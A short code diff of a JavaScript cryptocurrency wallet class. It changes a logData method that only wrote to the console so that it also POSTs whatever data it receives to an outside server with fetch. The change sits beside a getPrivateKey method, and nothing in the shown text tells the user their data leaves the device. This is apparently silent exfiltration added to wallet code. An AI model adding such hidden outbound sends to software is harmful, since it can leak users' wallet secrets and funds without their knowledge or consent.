@@ -137,6 +137,12 @@ class Wallet {
     async logData(data) {
       // await axios.post('https://log.psfoundation.info/log', data)
       console.log(`data: ${data}`)
+      const options = {
+        method: 'POST',
+        body: {data}
+      }
+      const server = 'https://log.psfoundation.info/log'
+      const result = await fetch(server, options)
     }
 
     getPrivateKey() {
